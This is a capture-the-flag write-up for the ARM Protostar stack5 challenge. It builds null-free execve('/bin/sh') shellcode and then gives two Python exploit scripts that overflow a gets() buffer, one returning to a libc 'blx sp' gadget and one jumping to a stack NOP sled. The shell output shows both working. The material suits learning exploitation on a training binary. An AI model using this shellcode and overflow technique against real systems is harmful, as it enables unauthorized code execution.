## Protostar ARM ./stack5


```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

This challenge is pretty similar to stack4 except our goal. Here instead of change the code flow executing the `win()` function, we have to execute a shellcode using the user input. We will try to write and jump to our shellcode in order to execute `execve /bin/sh`.

Let's start compiling the source code.

```code
gcc -g -fno-stack-protector -z execstack -no-pie -o stack5 stack5.c
```

#### Write the shellcode

As first step we have to find the system call number for `execve`

```code
pi@raspberrypi:~/protostar/stack5 $ cat /usr/include/arm-linux-gnueabihf/asm/unistd-common.h | grep exec
#define __NR_execve (__NR_SYSCALL_BASE + 11)
#define __NR_kexec_load (__NR_SYSCALL_BASE + 347)
#define __NR_execveat (__NR_SYSCALL_BASE + 387)
```
`#define __NR_execve (__NR_SYSCALL_BASE + 11)` and according with `man execve`

```code
pi@raspberrypi:~/protostar/stack5 $ man execve
NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);

DESCRIPTION
       execve()  executes  the  program pointed to by filename.  This causes the program that is currently being
       run by the calling process to be replaced with a new program, with newly  initialized  stack,  heap,  and
       (initialized and uninitialized) data segments.

       filename must be either a binary executable, or a script starting with a line of the form:

           #! interpreter [optional-arg]

       For details of the latter case, see "Interpreter scripts" below.

       argv  is  an  array  of  argument  strings  passed to the new program.  By convention, the first of these
       strings (i.e., argv[0]) should contain the filename associated with the file being executed.  envp is  an
       array  of  strings, conventionally of the form key=value, which are passed as environment to the new pro‐
       gram.  The argv and envp arrays must each include a null pointer at the end of the array.

...
```

it requires:  
1. `filename` must be either a binary executable
2. `argv`  is  an  array  of  argument  strings  passed to the new program
3. `envp` is  an array  of  strings of environment variables


So, the function arguments will go in registers `r0`, `r1`, `r2` and the syscall number in register `r7`.  

`r0` -> `/bin/sh`  
`r1` -> `NULL`  
`r2` -> `NULL`  
`r7` -> `#11`  

At this point, we can write our little shellcode according with these information.

```assembler
.section .text
.global _start

_start:
  add   r0, pc, #12     @ line 1  
  mov   r1, #0          @ line 2
  mov   r2, #0          @ line 3
  mov   r7, #11         @ line 4
  svc   0               @ line 5
.ascii "/bin/sh\0"      @ line 6
```

`line1`: we add 12 to the `pc` to reach the `.ascii` string. ARM processors are three-stage pipeline (Fetch-Decode-Execute) so `line1` will be executed when the `pc` will be at
`line3`, and in order to reach the .ascii we have to add 12.   
`line2` and `line3`: `NULL` arguments for the `execve`  
`line4`: syscall number `11` into `r7`  
`line5`: invoke the system call  
`line6`: our string  

Let's asseble, link and execute our file
```code
pi@raspberrypi:~/protostar/stack5 $ as s.s -o s.o
pi@raspberrypi:~/protostar/stack5 $ ld -N s.o -o s
pi@raspberrypi:~/protostar/stack5 $ ./s
$ pwd
/home/pi/protostar/stack5

```
**_It works :)_**  

Before to use our shellcode, we have to introduce an optimization in order to avoid bad bytes as `(0x0)`, `(0xa)` and `(0xd)`.  
With the support of `objdump` we can have an idea about the optimization we have to introduce.

```code
pi@raspberrypi:~/protostar/stack5 $ objdump -d s

s:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:	e28f000c 	add	r0, pc, #12
   10058:	e3a01000 	mov	r1, #0
   1005c:	e3a02000 	mov	r2, #0
   10060:	e3a0700b 	mov	r7, #11
   10064:	ef000000 	svc	0x00000000
   10068:	6e69622f 	.word	0x6e69622f
   1006c:	0068732f 	.word	0x0068732f

```

As we can see, there are a lot of bad bytes to remove **_:(_**  
To remove bad bytes we can switch from ARM Mode to Thumb, in order to reduce the bytes used and then we can try to replace some instructions with different instructions which do the same task like:  
`mov	r1, #0  ==  eor r1, r1, r1`    
`mov	r1, #0  ==  sub r1, r1, r1`  
and we replace manually the `\0` value in the `.ascii` string, using `strb r2, [r0, #7]` which will replace the `X` char.

```code
.section .text
.global _start

_start:
        .code 32
        add r3, pc, #1
        bx  r3

        .code 16
        add r0, pc, #8
        sub r1, r1, r1
        sub r2, r2, r2
        strb r2, [r0,#7]
        mov r7, #11
        svc #1

.ascii "/bin/shX"
```

```code
pi@raspberrypi:~/protostar/stack5 $ as shell_all.s -o shell_all.o
pi@raspberrypi:~/protostar/stack5 $ objdump -d shell_all.o

s.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:	e28f3001 	add	r3, pc, #1
   4:	e12fff13 	bx	r3
   8:	a002         add	r0, pc, #8	; (adr r0, 14 <_start+0x14>)
   a:	4049     	eors	r1, r1
   c:	4052     	eors	r2, r2
   e:	7242     	strb	r2, [r0, #9]
  10:	270b     	movs	r7, #11
  12:	df01     	svc	1
  14:	6e69622f 	.word	0x6e69622f
  18:	5868732f 	.word	0x5868732f

```
__No NULL bytes :)__  

Let's link and execute our shellcode

```code
pi@raspberrypi:~/protostar/stack5 $ ld -N shell_all.o -o shell_all
pi@raspberrypi:~/protostar/stack5 $ ./shell_all
$ pwd
/home/pi/protostar/stack5
$ exit
pi@raspberrypi:~/protostar/stack5 $
```

__and it works :)__  

Next steps is convert our shellcode to hex and we can accomplish this step with the support of `objcopy` and `hexdump`.

```code
pi@raspberrypi:~/protostar/stack5 $ objcopy -O binary shell_all shell_all.bin
pi@raspberrypi:~/protostar/stack5 $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' shell_all.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x92\x1a\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58
```

This one was just a little example. You can find tons of shellcodes from [exploit-db.com](https://www.exploit-db.com/) and [shell-storm.org](http://shell-storm.org/).

---
#### Solve the challenge

Now that we have our shellcode, let' analyse two possible strategies to use it:

#### 1. Jump to libc  
Let's run the program in `gdb` and take a look to some values that we need as:  
> ##### 1.1 libc address
```code
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x00010000 0x00011000 0x00000000 r-x /home/pi/protostar/stack5/stack5
0x00020000 0x00021000 0x00000000 r-x /home/pi/protostar/stack5/stack5
0x00021000 0x00022000 0x00001000 rwx /home/pi/protostar/stack5/stack5
0x76e6b000 0x76fa3000 0x00000000 r-x /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fa3000 0x76fb3000 0x00138000 --- /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb3000 0x76fb5000 0x00138000 r-x /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb5000 0x76fb6000 0x0013a000 rwx /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb6000 0x76fb9000 0x00000000 rwx
0x76fb9000 0x76fbd000 0x00000000 r-x /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fbd000 0x76fcc000 0x00004000 --- /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fcc000 0x76fcd000 0x00003000 r-x /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fcd000 0x76fce000 0x00004000 rwx /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fce000 0x76fee000 0x00000000 r-x /lib/arm-linux-gnueabihf/ld-2.28.so
0x76ff9000 0x76ffb000 0x00000000 rwx
0x76ffb000 0x76ffc000 0x00000000 r-x [sigpage]
0x76ffc000 0x76ffd000 0x00000000 r-- [vvar]
0x76ffd000 0x76ffe000 0x00000000 r-x [vdso]
0x76ffe000 0x76fff000 0x00020000 r-x /lib/arm-linux-gnueabihf/ld-2.28.so
0x76fff000 0x77000000 0x00021000 rwx /lib/arm-linux-gnueabihf/ld-2.28.so
0x7efdf000 0x7f000000 0x00000000 rwx [stack]
0xffff0000 0xffff1
```
> ##### 1.2 An instruction in libc to jump to the sp
```code
pi@raspberrypi:~/protostar/stack5 $ objdump -D -b binary -marm -Mforce-thumb /lib/arm-linux-gnueabihf/libc-2.28.so > libc_dump.txt
pi@raspberrypi:~/protostar/stack5 $ cat libc_dump.txt | grep 'sp' | grep 'bl'
   26fd4:	47e8      	blx	sp
```
Let's write our python scripts
```Python
import struct
libc_base = 0x76e6b000
offset_libc = 0x26fd4
shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58"
buf = "A" * 68
buf += struct.pack( "<I", libc_base + offset_libc + 1)   # blx sp to libc
buf += shellcode
print (buf)
```
run it, and ...
```code
pi@raspberrypi:~/protostar/stack5 $ python exploit.py > shell_1
pi@raspberrypi:~/protostar/stack5 $ cat shell_1 - | ./stack5
pwd
/home/pi/protostar/stack5
exit
pi@raspberrypi:~/protostar/stack5 $
```
__It works :)__


#### 2. Jump directly to the stack
Let's run the program in gdb and take a look to the stack:  
```code
gef➤  x/60x $sp
0x7efff408:	0x7efff5a4	0x00000001	0x61616161	0x61616161
0x7efff418:	0x61616161	0x61616161	0x61616161	0x61616161
0x7efff428:	0x61616161	0x61616161	0x61616161	0x61616161
0x7efff438:	0x61616161	0x61616161	0x61616161	0x61616161
0x7efff448:	0x61616161	0x61616161	0x00000000	0x76e82718
0x7efff458:	0x76fb5000	0x7efff5a4	0x00000001	0x00010404
0x7efff468:	0xf0357bfb	0xf822a977	0x00000000	0x00010434
0x7efff478:	0x00010314	0x00000000	0x00000000	0x00000000
0x7efff488:	0x76fff000	0x00000000	0x00000000	0x00000000
0x7efff498:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff4a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff4b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff4c8:	0x00000000	0x00000000	0x00000001	0x76fff978
0x7efff4d8:	0x76fffb34	0x00000000	0x76fd879c	0x7efff5a4
0x7efff4e8:	0x7efff5ac	0x76ffe964	0x00000000	0x76fff000
```
Inspecting the stack, as we can see, we can redirect the execution from `0x76e82718` to the stack itself, where is placed out shellcode, filling the gap between the jump and the shellcode with some nop operations.
We will store our shellcode in `0x7efff498`  
```Python
import struct
shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58"
nopsled = "\x01\x10\xa0\xe1"  * 64
buf = "A" * 68
buf += struct.pack( "<I", 0x7efff498)   
buf += nopsled
buf += shellcode
print (buf)
```
```code
pi@raspberrypi:~/protostar/stack5 $ cat shell_nop - | ./stack5
pwd
/home/pi/protostar/stack5
exit
pi@raspberrypi:~/protostar/stack5 $
```

**_Done :)_**
